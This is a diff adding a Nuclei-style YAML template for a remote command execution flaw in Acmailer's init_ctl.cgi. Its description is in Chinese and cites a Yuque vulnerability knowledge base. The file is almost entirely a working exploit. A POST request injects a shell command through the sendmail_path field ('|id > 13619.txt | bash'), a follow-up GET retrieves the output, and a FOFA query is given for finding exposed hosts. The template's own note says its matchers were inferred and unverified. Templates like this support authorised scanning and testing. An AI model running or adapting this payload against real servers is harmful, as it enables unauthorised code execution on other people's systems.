@@ -1,0 +1,53 @@
+id: poc-7878131b35c5fd056994
+info:
+  name: Acmailer邮件系统init_ctl存在远程命令执行漏洞
+  author: hacktwo
+  severity: critical
+  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/7878131b35c5fd0569947ee6eceb9e5b
+
+    [!] 推断说明: 状态码缺失, 推断为 200。原文响应特征为截图, 无法自动提取文本命中条件, 使用前请人工核验。'
+  tags: rce,2025
+  metadata:
+    source: yuque-hacktwo-dtdx2v
+    doc-slug: 7878131b35c5fd0569947ee6eceb9e5b
+    fofa: + fofa`body="CGI acmailer"`
+http:
+- raw:
+  - 'POST /init_ctl.cgi HTTP/1.1
+
+    Host: {{Hostname}}
+
+    User-Agent: Mozilla/5.0
+
+    Connection: close
+
+    Content-Length: 150
+
+    Content-Type: application/x-www-form-urlencoded
+
+    Accept-Encoding: gzip, deflate
+
+
+    admin_name=u&admin_email=m@m.m&login_id=l&login_pass=l&sendmail_path=|id > 13619.txt | bash&homeurl=http://&mypath=e'
+  redirects: false
+  matchers:
+  - status:
+    - 200
+    type: status
+- raw:
+  - 'GET /13619.txt HTTP/1.1
+
+    Host: {{Hostname}}
+
+    User-Agent: Mozilla/5.0
+
+    Connection: close
+
+    Cookie: sid=a6d9c99e3ae98d10ee34acc24af3f536
+
+    Accept-Encoding: gzip, deflate'
+  redirects: false
+  matchers:
+  - status:
+    - 200
+    type: status
